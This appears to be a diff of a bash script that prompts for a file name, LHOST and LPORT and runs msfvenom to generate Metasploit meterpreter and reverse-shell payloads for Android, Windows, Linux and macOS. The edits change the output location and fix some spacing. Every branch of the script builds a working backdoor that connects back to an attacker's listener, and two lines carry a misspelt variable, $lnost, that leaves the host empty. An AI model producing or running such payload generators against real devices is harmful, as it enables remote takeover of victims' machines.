@@ -47,28 +47,28 @@ then
        echo -n 'Enter LPORT : '
        read lport
        echo 'Generating Payload Please wait !!!! '
-       msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R >/output/ $opt.apk
-       elif [ $type == $b ];
-       then
-           echo -n 'Enter name os of Output file' :
-      	   read opt
-           echo -n 'Enter LHOST : '
-           read lhost
-           echo -n 'Enter LPORT : '
-           read lport
-           echo 'Generating Payload Please wait !!!'
-           msfvenom -p android/meterpreter/reverse_http LHOST=$lhost LPORT=$lport R > /output/$opt.apk
-       elif [ $type == $c ];
-       then
-           echo -n 'Enter name os of Output file' :
-           read opt
-           echo -n 'Enter LHOST : '
-           read lhost
-           echo -n 'Enter LPORT : '
-           read lport
-           echo 'Generating Payload Please wait !!!'
-           msfvenom -p android/meterpreter/reverse_https LHOST=$lnost LPORT=$lport R > /output/$opt.apk
-      else
+       msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $opt.apk
+   elif [ $type == $b ];
+   then
+       echo -n 'Enter name os of Output file' :
+       read opt
+       echo -n 'Enter LHOST : '
+       read lhost
+       echo -n 'Enter LPORT : '
+       read lport
+       echo 'Generating Payload Please wait !!!'
+       msfvenom -p android/meterpreter/reverse_http LHOST=$lhost LPORT=$lport R > $opt.apk
+   elif [ $type == $c ];
+   then
+       echo -n 'Enter name os of Output file' :
+       read opt
+       echo -n 'Enter LHOST : '
+       read lhost
+       echo -n 'Enter LPORT : '
+       read lport
+       echo 'Generating Payload Please wait !!!'
+       msfvenom -p android/meterpreter/reverse_https LHOST=$lnost LPORT=$lport R > $opt.apk
+   else
           echo 'Invalid Choice'
           exit
        fi
@@ -80,7 +80,7 @@ then
     b=2
     echo -n 'Enter payload type : '
     read type
-    if [ $type ==$a ];
+    if [ $type == $a ];
     then
          echo -n 'Enter name os of Output file' :
          read opt
@@ -89,7 +89,7 @@ then
          echo -n 'Enter LPORT : '
          read lport
          echo 'Generating Payload Please wait !!!'
-         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f  exe > /output/$opt.exe
+         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f  exe > $opt.exe
     elif [ $type == $b ];
     then
         echo -n 'Enter name os of Output file' :
@@ -99,7 +99,7 @@ then
         echo -n 'Enter LPORT : '
         read lport
         echo 'Generating Payload Please wait !!!'
-	   msfvenom -p windows/meterpreter/reverse_http LHOST=$lhost LPORT=$lport -f exe > /output/$opt.exe
+	   msfvenom -p windows/meterpreter/reverse_http LHOST=$lhost LPORT=$lport -f exe > $opt.exe
     else
         echo 'Invalid Choice'
         exit
@@ -113,7 +113,7 @@ then
     echo -n 'Enter LPORT : '
     read lport
     echo 'Generating Payload Please wait !!!'
-    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lnost LPORT=$lport -f elf > /output/$opt.elf
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lnost LPORT=$lport -f elf > $opt.elf
 elif [ $platform == $d ];
 then
     echo -n 'Enter name os of Output file' :
@@ -123,8 +123,8 @@ then
     echo -n 'Enter LPORT : '
     read lport
     echo 'Generating Payload Please wait !!!'
-    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /output/$opt.macho
+    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $opt.macho
 else
     echo 'Invalid Choice'
 fi
-echo 'Your payload is in output directory'
+echo 'Type ls to see your payload'
